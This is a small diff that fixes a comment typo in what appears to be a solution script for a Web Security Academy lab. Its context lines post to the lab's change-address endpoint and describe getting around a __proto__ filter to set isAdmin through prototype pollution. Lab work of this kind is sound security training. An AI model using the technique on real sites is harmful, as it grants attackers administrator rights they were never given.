@@ -36,7 +36,7 @@ def main():
     }
     r2 = s.post(uri, json=data)   
 
-    # we can post to the change-address endpoint and change the isAdmin properity of the user object
+    # we can post to the change-address endpoint and change the isAdmin property of the user object
     # since __proto__ is filtered, we have to use an alternate way of accessing the object prototype
     uri = f"https://{lab_id}.web-security-academy.net/my-account/change-address"
     
